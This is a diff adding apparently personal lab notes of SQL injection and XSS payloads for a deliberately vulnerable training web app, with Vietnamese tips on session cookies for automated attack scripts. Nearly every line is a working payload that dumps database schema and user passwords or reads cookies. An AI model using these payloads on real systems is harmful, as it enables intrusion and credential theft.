@@ -1,0 +1,35 @@
+******1.Sql injection (get seaech)
+- lam' or 1=1 #
+- lam' union select 1,user(),3,4,5,6,7 #
+- lam' union select 1,user(), database(),4,5,6,7 #
+- lam ' union select 1, (select GROUP_CONCAT(table_name,'\n') from information_schema.tables where table_type='BASE TABLE'),3,4,5,6,7 #
+- lam' UNION SELECT 1, (SELECT GROUP_CONCAT(login,':', password) FROM users),3,4,5,6,7 #
+- lam 'order by 1#
+- uyen ' union select 1, (select GROUP_CONCAT(column_name,'\n') FROM information_schema.columns WHERE table_name ='users'),3,4,5,6,7 #
+****2. SQL Injection (GET SELECT)
++ http://192.168.189.133:80/sqli_2.php?movie=2&action=go’ or 1=1
++ http://192.168.189.133:80/sqli_2.php?movie=2’ or 1=1&action=go 
++ http://192.168.189.133:80/sqli_2.php?movie=100 union select 1, 2,3,4,5,6,7 #&action=go
++ http://192.168.189.133:80/sqli_2.php?movie= 100 union select 1, (SELECT GROUP_CONCAT(table_name, '---') FROM information_schema.tables where table_type='BASE TABLE'),3,4,5,6,7 #&action=go
++ http://192.168.189.133:80/sqli_2.php?movie=100 union select 1, (select GROUP_CONCAT(column_name,'\n') FROM information_schema.columns WHERE table_name ='users'),3,4,5,6,7 #&action=go
++ http://192.168.189.133:80/sqli_2.php?movie=100 UNION SELECT 1, (SELECT GROUP_CONCAT(login,':', password) FROM users),3,4,5,6,7 #&action=go
+*******3.SQL Injection (AJAX/JSON/jQuery)
+- u%'union select 1,2,3,4,5,6,7 # 
+- u%'union select 1,user(),3,4,5,6,7 #
+- u%' union select 1, (select GROUP_CONCAT(table_name,'\n') from information_schema.tables where table_type='BASE TABLE'),3,4,5,6,7 #
+- uyen ' union select 1, (select GROUP_CONCAT(column_name,'\n') FROM information_schema.columns WHERE table_name ='users'),3,4,5,6,7 #
+- uyen' UNION SELECT 1, (SELECT GROUP_CONCAT(login,':', password) FROM users),3,4,5,6,7 #
+****4. XSS - Reflected (GET)
+- <script>alert(document.cookie)</script>
+****5.XSS - Reflected (POST)
+- <script>alert(document.cookie)</script>
+****6.XSS - Reflected (JSON)
+- "}]}';alert(document.cookie)</script>
+
+******======
+với các file tấn công tự động ta cần chú ý đến:
+ - 'security_level': '0',   # mức độ low
+ - 'PHPSESSID': '0k6gg6biqflmnbb39ttveugod1'# mỗi lần đăng nhâp vào thì cái này sẽ bị thay đổi
+ - ip của máy client
+ - lấy PHPSESSID như sau: vào inspect -> application/store -> cookies để lấy ra giá trị
+
